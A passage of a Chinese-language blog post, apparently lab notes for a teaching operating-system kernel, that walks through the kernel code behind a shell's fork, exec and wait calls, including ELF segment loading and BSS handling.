class="number">0</span>)</span><br><span class="line">        &#123; <span class="comment">/* Child runs user job */</span></span><br><span class="line">            <span class="keyword">if</span> (execve(argv[<span class="number">0</span>], argv, environ) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%s: Command not found.\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Parent waits for foreground job to terminate */</span></span><br><span class="line">        <span class="keyword">if</span> (!bg)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> status;</span><br><span class="line">            <span class="keyword">if</span> (waitpid(pid, &amp;status, <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">                unix_error(<span class="string">&quot;waitfg: waitpid error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d %s&quot;</span>, pid, cmdline);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>它的首要任务是调用 parseline 函数，这个函数解析了以空格分隔的命令行参数，并构造最终会传递给 execve 的 argv 向量。</p>
<p>第一个参数被假设为要么是一个内置的 shell 命令名，马上就会解释这个命令，要么是一个可执行目标文件，会在一个新的子进程的上下文中加载并运行这个文件。<br>如果最后一个参数是一个“&amp;”字符，那么 parseline 返回 1,表示应该在后台执行<br>该程序(shell 不会等待它完成)。否则，它返回 0，表示应该在前台执行这个程序(shell 会等待它完成)。</p>
<p>在解析了命令行之后，eval 函数调用 builtin_command 函数，该函数检查第一个命令行参数是否是一个内置的 shell 命令。如果是，它就立即解释这个命令，并返回值 1。否则返回 0。</p>
<p>shell 有大量的命令，比如 pwd、jobs 和 fg。如果 builtin_command 返回 0, 那么 shell 创建一个子进程，并在子进程中执行所请求的程序。如果用户要求在后台运行该程序，那么 shell 返回到循环的顶部，等待下一个命令行。否则，shell 使用 waitpid 函数等待作业终止。当作业终止时，shell 就开始下一轮迭代。</p>
<p><strong>简而言之就是先使用 fork 调用，fork 出一个子进程，再让子进程执行 exec 调用运行程序，根据是否有 &amp; 来决定是否显式的去调用 wait 等待该进程终止。</strong></p>
<h3 id="fork"><a href="#fork" class="headerlink" title="fork"></a>fork</h3><p>根据上面的调用顺序，首先看 fork 调用时都执行了哪些内容：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">sys_fork(<span class="keyword">uint32_t</span> arg[]) &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">trapframe</span> *<span class="title">tf</span> =</span> current-&gt;tf;</span><br><span class="line">    <span class="keyword">uintptr_t</span> <span class="built_in">stack</span> = tf-&gt;tf_esp;</span><br><span class="line">    <span class="keyword">return</span> do_fork(<span class="number">0</span>, <span class="built_in">stack</span>, tf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">do_fork</span><span class="params">(<span class="keyword">uint32_t</span> clone_flags, <span class="keyword">uintptr_t</span> <span class="built_in">stack</span>, struct trapframe *tf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret = -E_NO_FREE_PROC;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">proc</span>;</span> <span class="comment">//新建一个进程结构</span></span><br><span class="line">    <span class="keyword">if</span> (nr_process &gt;= MAX_PROCESS)</span><br><span class="line">        <span class="keyword">goto</span> fork_out;</span><br><span class="line">    ret = -E_NO_MEM;</span><br><span class="line">    <span class="keyword">if</span> ((proc = alloc_proc()) == <span class="literal">NULL</span>) <span class="comment">//为进程结构分配空间（slab）</span></span><br><span class="line">        <span class="keyword">goto</span> fork_out;</span><br><span class="line">    proc-&gt;parent = current; <span class="comment">//设置其父进程为调用进程</span></span><br><span class="line">    <span class="keyword">if</span> (setup_kstack(proc) != <span class="number">0</span>) <span class="comment">//新分配一个大小为两页的内核栈</span></span><br><span class="line">        <span class="keyword">goto</span> bad_fork_cleanup_proc;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//设置新进程的页表，如果clone_flags</span></span><br><span class="line">    <span class="comment">//CLONE_VM : 父子进程共享页表 直接设置子进程的页表指向父进程</span></span><br><span class="line">    <span class="comment">//否则调用dup_mmap进行页表的复制</span></span><br><span class="line">    <span class="keyword">if</span> (copy_mm(clone_flags, proc) != <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">goto</span> bad_fork_cleanup_kstack;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//参考Lab4的分析，修改contxt的eip在后面wakeup这个进程后去执行forkret</span></span><br><span class="line">    <span class="comment">//之前内核进程强改中断帧eip，最后去执行了内核进程被要求执行的函数</span></span><br><span class="line">    <span class="comment">//这没改eip 可认为最后该fork进程会返回到原来调用进程相同的地方</span></span><br><span class="line">    copy_thread(proc, <span class="built_in">stack</span>, tf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">bool</span> intr_flag;</span><br><span class="line">    local_intr_save(intr_flag);</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 把新进程链到表上</span></span><br><span class="line">        proc-&gt;pid = get_pid();</span><br><span class="line">        hash_proc(proc);</span><br><span class="line">        set_links(proc);</span><br><span class="line">    &#125;</span><br><span class="line">    local_intr_restore(intr_flag);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 修改进程状态设置为可执行，不是直接就调用这进程，只是到就绪态等待os调度</span></span><br><span class="line">    wakeup_proc(proc);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回fork进程的 pid</span></span><br><span class="line">    ret = proc-&gt;pid;</span><br><span class="line">fork_out:</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">bad_fork_cleanup_kstack:</span><br><span class="line">    put_kstack(proc);</span><br><span class="line">bad_fork_cleanup_proc:</span><br><span class="line">    kfree(proc);</span><br><span class="line">    <span class="keyword">goto</span> fork_out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">copy_thread(struct proc_struct *proc, <span class="keyword">uintptr_t</span> esp, struct trapframe *tf)</span><br><span class="line">&#123;</span><br><span class="line">    proc-&gt;tf = (struct trapframe *)(proc-&gt;kstack + KSTACKSIZE) - <span class="number">1</span>;</span><br><span class="line">    *(proc-&gt;tf) = *tf;</span><br><span class="line">    proc-&gt;tf-&gt;tf_regs.reg_eax = <span class="number">0</span>; <span class="comment">// 注意到这的eax被赋值了0</span></span><br><span class="line">    proc-&gt;tf-&gt;tf_esp = esp;        <span class="comment">// 原来操作系统用户栈的位置</span></span><br><span class="line">    proc-&gt;tf-&gt;tf_eflags |= FL_IF;</span><br><span class="line"></span><br><span class="line">    proc-&gt;context.eip = (<span class="keyword">uintptr_t</span>)forkret;<span class="comment">//最后会跳到中断结束处理那返回</span></span><br><span class="line">    proc-&gt;context.esp = (<span class="keyword">uintptr_t</span>)(proc-&gt;tf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>fork 函数的定义是父进程返回创建子进程的 pid，子进程中 fork 返回 0。这个逻辑在上面的函数中也得到了印证，因为中断结束的时候返回了 proc-&gt;pid，在设置 copy_thread 中的中断帧的时候吧 reg_eax 设置为 0。</p>
<h2 id="exec"><a href="#exec" class="headerlink" title="exec"></a>exec</h2><p>在 fork 调用结束后，子进程会调用 exec 执行新的进程，简要来说 exec 的执行过程就是把原来子进程的除了 pid，内核栈等属于子进程自己私有的东西保留。其他从父进程复制过来的的东西全部释放，并读取 ELF 格式的文件建立新的页表，vma。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">sys_exec(<span class="keyword">uint32_t</span> arg[]) &#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *name = (<span class="keyword">const</span> <span class="keyword">char</span> *)arg[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">size_t</span> len = (<span class="keyword">size_t</span>)arg[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *binary = (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)arg[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">size_t</span> size = (<span class="keyword">size_t</span>)arg[<span class="number">3</span>];</span><br><span class="line">    <span class="keyword">return</span> do_execve(name, len, binary, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">do_execve</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *name, <span class="keyword">size_t</span> len, <span class="keyword">unsigned</span> <span class="keyword">char</span> *binary, <span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> =</span> current-&gt;mm;</span><br><span class="line">    <span class="comment">// 检查载入的程序是否是在用户空间里</span></span><br><span class="line">    <span class="keyword">if</span> (!user_mem_check(mm, (<span class="keyword">uintptr_t</span>)name, len, <span class="number">0</span>))</span><br><span class="line">        <span class="keyword">return</span> -E_INVAL;</span><br><span class="line">    <span class="keyword">if</span> (len &gt; PROC_NAME_LEN)</span><br><span class="line">        len = PROC_NAME_LEN;</span><br><span class="line">    <span class="comment">// 处理进程名称字符串</span></span><br><span class="line">    <span class="keyword">char</span> local_name[PROC_NAME_LEN + <span class="number">1</span>];</span><br><span class="line">    <span class="built_in">memset</span>(local_name, <span class="number">0</span>, <span class="keyword">sizeof</span>(local_name));</span><br><span class="line">    <span class="built_in">memcpy</span>(local_name, name, len);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 把页表换成内核空间的，并释放之前的页表</span></span><br><span class="line">    <span class="comment">//（因为可能有父子进程共享页表的情况，所以先设置一下mm的引用计数，确定没人用再删）</span></span><br><span class="line">    <span class="keyword">if</span> (mm != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        lcr3(boot_cr3);</span><br><span class="line">        <span class="keyword">if</span> (mm_count_dec(mm) == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            exit_mmap(mm);</span><br><span class="line">            put_pgdir(mm);</span><br><span class="line">            mm_destroy(mm);</span><br><span class="line">        &#125;</span><br><span class="line">        current-&gt;mm = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    <span class="comment">//载入ELF文件，设置好mm、vma、用户栈、页表</span></span><br><span class="line">    <span class="keyword">if</span> ((ret = load_icode(binary, size)) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">goto</span> execve_exit;</span><br><span class="line">    &#125;</span><br><span class="line">    set_proc_name(current, local_name);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">execve_exit:</span><br><span class="line">    do_exit(ret);</span><br><span class="line">    panic(<span class="string">&quot;already exit: %e.\n&quot;</span>, ret);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">tatic <span class="keyword">int</span></span><br><span class="line">load_icode(<span class="keyword">unsigned</span> <span class="keyword">char</span> *binary, <span class="keyword">size_t</span> size)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (current-&gt;mm != <span class="literal">NULL</span>)</span><br><span class="line">        panic(<span class="string">&quot;load_icode: current-&gt;mm must be empty.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> ret = -E_NO_MEM;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span>;</span></span><br><span class="line">    <span class="comment">//(1) create a new mm for current process</span></span><br><span class="line">    <span class="keyword">if</span> ((mm = mm_create()) == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">goto</span> bad_mm;</span><br><span class="line">    <span class="comment">//建个新的PDT, 并把内核上3G地址页目录表拷过去</span></span><br><span class="line">    <span class="keyword">if</span> (setup_pgdir(mm) != <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">goto</span> bad_pgdir_cleanup_mm;</span><br><span class="line">    <span class="comment">//(3) copy TEXT/DATA section, build BSS parts in binary to memory space of process</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Page</span> *<span class="title">page</span>;</span></span><br><span class="line">    <span class="comment">//(3.1) get the file header of the bianry program (ELF format)</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">elfhdr</span> *<span class="title">elf</span> =</span> (struct elfhdr *)binary;</span><br><span class="line">    <span class="comment">//(3.2) get the entry of the program section headers of the bianry program (ELF format)</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proghdr</span> *<span class="title">ph</span> =</span> (struct proghdr *)(binary + elf-&gt;e_phoff);</span><br><span class="line">    <span class="comment">//(3.3) This program is valid?</span></span><br><span class="line">    <span class="keyword">if</span> (elf-&gt;e_magic != ELF_MAGIC)</span><br><span class="line">    &#123;</span><br><span class="line">        ret = -E_INVAL_ELF;</span><br><span class="line">        <span class="keyword">goto</span> bad_elf_cleanup_pgdir;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint32_t</span> vm_flags, perm;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proghdr</span> *<span class="title">ph_end</span> =</span> ph + elf-&gt;e_phnum;</span><br><span class="line">    <span class="keyword">for</span> (; ph &lt; ph_end; ph++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//(3.4) find every program section headers</span></span><br><span class="line">        <span class="comment">//ELF_PT_LOAD表示一个可加载的段,段的大小由 p_filesz 和 p_memsz 描述。</span></span><br><span class="line">        <span class="keyword">if</span> (ph-&gt;p_type != ELF_PT_LOAD)</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">if</span> (ph-&gt;p_filesz &gt; ph-&gt;p_memsz)</span><br><span class="line">        &#123;</span><br><span class="line">            ret = -E_INVAL_ELF;</span><br><span class="line">            <span class="keyword">goto</span> bad_cleanup_mmap;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (ph-&gt;p_filesz == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        <span class="comment">//(3.5) call mm_map fun to setup the new vma ( ph-&gt;p_va, ph-&gt;p_memsz)</span></span><br><span class="line">        <span class="comment">// vma 应该是一个段一个（一并记录该段的读写等权限） 并且页表权限一开始就与了PTE_U，让用户有权限看到自己的页表</span></span><br><span class="line">        vm_flags = <span class="number">0</span>, perm = PTE_U;</span><br><span class="line">        <span class="keyword">if</span> (ph-&gt;p_flags &amp; ELF_PF_X)</span><br><span class="line">            vm_flags |= VM_EXEC;</span><br><span class="line">        <span class="keyword">if</span> (ph-&gt;p_flags &amp; ELF_PF_W)</span><br><span class="line">            vm_flags |= VM_WRITE;</span><br><span class="line">        <span class="keyword">if</span> (ph-&gt;p_flags &amp; ELF_PF_R)</span><br><span class="line">            vm_flags |= VM_READ;</span><br><span class="line">        <span class="keyword">if</span> (vm_flags &amp; VM_WRITE)</span><br><span class="line">            perm |= PTE_W;</span><br><span class="line">        <span class="comment">//p_vaddr 段在内存中的虚拟地址</span></span><br><span class="line">        <span class="comment">//查看这段在vma中是否存在，不存在新建一个vma并插到mm里</span></span><br><span class="line">        <span class="keyword">if</span> ((ret = mm_map(mm, ph-&gt;p_va, ph-&gt;p_memsz, vm_flags, <span class="literal">NULL</span>)) != <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">goto</span> bad_cleanup_mmap;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//下面开始向OS申请空间，复制ELF的内容到虚拟空间中，并填好对应的页表</span></span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">char</span> *from = binary + ph-&gt;p_offset;</span><br><span class="line">        <span class="keyword">size_t</span> off, size;</span><br><span class="line">        <span class="keyword">uintptr_t</span> start = ph-&gt;p_va, end, la = ROUNDDOWN(start, PGSIZE);</span><br><span class="line">        ret = -E_NO_MEM;</span><br><span class="line">        <span class="comment">//(3.6) alloc memory, and  copy the contents of every program section (from, from+end) to process&#x27;s memory (la, la+end)</span></span><br><span class="line">        end = ph-&gt;p_va + ph-&gt;p_filesz;</span><br><span class="line">        <span class="comment">//(3.6.1) copy TEXT/DATA section of bianry program</span></span><br><span class="line">        <span class="keyword">while</span> (start &lt; end)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//根据la的地址，获取对应的一页内存，不存在申请一页并挂到页目录上</span></span><br><span class="line">            <span class="keyword">if</span> ((page = pgdir_alloc_page(mm-&gt;pgdir, la, perm)) == <span class="literal">NULL</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">goto</span> bad_cleanup_mmap;</span><br><span class="line">            &#125;</span><br><span class="line">            off = start - la, size = PGSIZE - off, la += PGSIZE;</span><br><span class="line">            <span class="keyword">if</span> (end &lt; la)</span><br><span class="line">            &#123;</span><br><span class="line">                size -= la - end;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">memcpy</span>(page2kva(page) + off, from, size);</span><br><span class="line">            start += size, from += size;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//(3.6.2) build BSS section of binary program</span></span><br><span class="line">        end = ph-&gt;p_va + ph-&gt;p_memsz;</span><br><span class="line">        <span class="keyword">if</span> (start &lt; la)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/* ph-&gt;p_memsz == ph-&gt;p_filesz */</span></span><br><span class="line">            <span class="keyword">if</span> (start == end)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            off = start + PGSIZE - la, size = PGSIZE - off;</span><br><span class="line">            <span class="keyword">if</span> (end &lt; la)</span><br><span class="line">            &#123;</span><br><span class="line">                size -= la - end;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">memset</span>(page2kva(page) + off, <span class="number">0</span>, size);</span><br><span class="line">            start += size;</span><br><span class="line">            assert((end &lt; la &amp;&amp; start == end) || (end &gt;= la &amp;&amp; start == la));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (start &lt; end)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> ((page = pgdir_alloc_page(mm-&gt;pgdir, la, perm)) == <span class="literal">NULL</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">goto</span> bad_cleanup_mmap;</span><br><span class="line">            &#125;</span><br><span class="line">            off = start - la, size = PGSIZE - off, la += PGSIZE;</span><br><span class="line">            <span class="keyword">if</span> (end &lt; la)</span><br><span class="line">            &#123;</span><br><span class="line">                size -= la - end;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">memset</span>(page2kva(page) + off, <span class="number">0</span>, size);</span><br><span class="line">            start += size;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置用户栈</span></span><br><span class="line">    vm_flags = VM_READ | VM_WRITE | VM_STACK;</span><br><span class="line">    <span class="comment">// 同样建一个vma,插到 mm 里（vma只是记录每段的起始位置（虚拟地址）和权限，真正找到物理地址还得看段表）</span></span><br><span class="line">    <span class="keyword">if</span> ((ret = mm_map(mm, USTACKTOP - USTACKSIZE, USTACKSIZE, vm_flags, <span class="literal">NULL</span>)) != <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">goto</span> bad_cleanup_mmap;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//(5) set current process&#x27;s mm, sr3, and set CR3 reg = physical addr of Page Directory</span></span><br><span class="line">    mm_count_inc(mm);</span><br><span class="line">    current-&gt;mm = mm;</span><br><span class="line">    current-&gt;cr3 = PADDR(mm-&gt;pgdir);</span><br><span class="line">    lcr3(PADDR(mm-&gt;pgdir));</span><br><span class="line"></span><br><span class="line">    <span class="comment">//(6) setup trapframe for user environment</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">trapframe</span> *<span class="title">tf</span> =</span> current-&gt;tf;</span><br><span class="line">    <span class="built_in">memset</span>(tf, <span class="number">0</span>, <span class="keyword">sizeof</span>(struct trapframe));</span><br><span class="line">    <span class="comment">//在这一步设置用户权限，使得返回后能够回到用户状态</span></span><br><span class="line">    tf-&gt;tf_cs = USER_CS;</span><br><span class="line">    tf-&gt;tf_ds = tf-&gt;tf_es = tf-&gt;tf_ss = USER_DS;</span><br><span class="line">    tf-&gt;tf_esp = USTACKTOP;</span><br><span class="line">    tf-&gt;tf_eip = elf-&gt;e_entry;</span><br><span class="line">    tf-&gt;tf_eflags = FL_IF;</span><br><span class="line">    ret = <span class="number">0</span>;</span><br><span class="line">out:</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">bad_cleanup_mmap:</span><br><span class="line">    exit_mmap(mm);</span><br><span class="line">bad_elf_cleanup_pgdir:</span><br><span class="line">    put_pgdir(mm);</span><br><span class="line">bad_pgdir_cleanup_mm:</span><br><span class="line">    mm_destroy(mm);</span><br><span class="line">bad_mm:</span><br><span class="line">    <span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>解释一下 p_filesz 与 p_memsz 的含义：p_filesz 代表这个段在 ELF 文件中的大小 p_memsz 代表这个段在内存中的大小。p_filesz&lt;=p_memsz，因为存在 BSS 段。BSS 段里面放置的都是未初始化的全局变量，这些东西如果全部放在 ELF 中既不能记录数据（因为没初始化），还会浪费存储，就设置了这两个长度，p_memsz-p_filesz 就是 BSS 段的长度，把这块区域也在内存中放出来，然后初始化为 0 就行。</p>
<blockquote>
<p>参考：<br><a target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-591986-1-1.html">ELF 文件格式解析</a> &gt; <a target="_blank" rel="noopener" href="https://blog.csdn.net/longtype/article/details/87887386">BSS 段解析</a></p>
</blockquote>
<h2 id="wait"><a href="#wait" class="headerlink" title="wait"></a>wait</h2><p>调用完 fork，exec 后，一个新的进程就跑了起来，该进程的父进程是依赖于启动他的 shell，是否有&amp;则决定了是否 wait。下面来看 wait 的实现。</p>
<p>在这个 lab 里 proc 的关系变得更加丰富：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">                     +----------------+</span><br><span class="line">                     | parent process |</span><br><span class="line">                     +----------------+</span><br><span class="line">              parent ^         \       ^  parent</span><br><span class="line">                    &#x2F;           \       \</span><br><span class="line">                   &#x2F;             \ cptr  \</span><br><span class="line">                  &#x2F;         yptr  V       \      yptr</span><br><span class="line">           +-------------+  --&gt;  +-------------+  --&gt;  NULL</span><br><span class="line">           | old process |       | New Process |</span><br><span class="line">NULL  &lt;--  +-------------+  &lt;--  +-------------+</span><br><span class="line">      optr                  optr</span><br></pre></td></tr></table></figure>
<p>下面是 linux 中对 wait 的定义</p>
<table>
<thead>
<tr>
<th>wait_pid</th>
<th align="center">meaning</th>
</tr>
</thead>
<tbody><tr>
<td>&lt; -1</td>
<td align="center">meaning wait for any child process whose process group ID is equal to the absolute value of pid.</td>
